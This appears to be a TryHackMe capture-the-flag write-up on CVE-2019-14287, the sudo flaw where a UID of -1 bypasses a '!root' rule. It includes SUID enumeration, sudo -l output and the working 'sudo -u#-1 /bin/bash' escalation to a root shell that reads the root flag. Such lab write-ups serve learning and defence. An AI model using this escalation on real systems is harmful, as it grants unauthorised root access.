#CVE-2019-14287 #SudoVulns
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
CVE-2019-14287 is a vulnerability found in the Unix Sudo program by a researcher working for Apple: Joe Vennix. Coincidentally, he also found the vulnerability that we'll be covering in the next room of this series. This exploit has since been fixed, but may still be present in older versions of Sudo (versions < 1.8.28), so it's well worth keeping an eye out for!

For those who might be unfamiliar with it: sudo is a command in unix that allows you to execute programs as other users. This usually defaults to the superuser (root), but it's also possible to execute programs as other users by specifying their username or UID. For example, sudo would usually be used like so: `sudo <command>`, but you could manually choose to execute it as another user like this: `sudo -u#<id> <command>`
```

```Steps
With the above configuration, using `sudo -u#0 <command>` (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute commands as user 0 we will be given an error. Enter CVE-2019-14287.

Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, _despite being explicitly prevented from doing so_. It is worth noting that this will _only_ work if you've been granted non-root sudo permissions for the command, as in the configuration above.

Practically, the application of this is as follows: `sudo -u#-1 <command>`
```

## Exploitation
`find / -perm -4000 -type f 2>/dev/null`

```bash
 find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/bin/umount
/bin/mount
/bin/su
tryhackme@sudo-privesc:~$ id
uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme)
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash 
```

```bash
tryhackme@sudo-privesc:~$ sudo -ll
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:

Sudoers entry:
    RunAsUsers: ALL, !root
    Options: !authenticate
    Commands:
        /bin/bash
```

which gives us the info about that user `tryhackme` have `/bin/bash` access without  authenticate 
and which can be run with sudo permission but without user `root` 

so lets exploit it
` sudo -u#-1 /bin/bash`

```bash
tryhackme@sudo-privesc:~$ sudo -u#-l whoami
sudo: unknown user: #-l
sudo: unable to initialize policy plugin
tryhackme@sudo-privesc:~$ sudo -u#-l /bin/bash
sudo: unknown user: #-l
sudo: unable to initialize policy plugin
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# whoami
root
root@sudo-privesc:~# ls
root@sudo-privesc:~# cat /root/root.txt
[flag omitted]
```

I got the Augest 
```flag 
[flag omitted]
```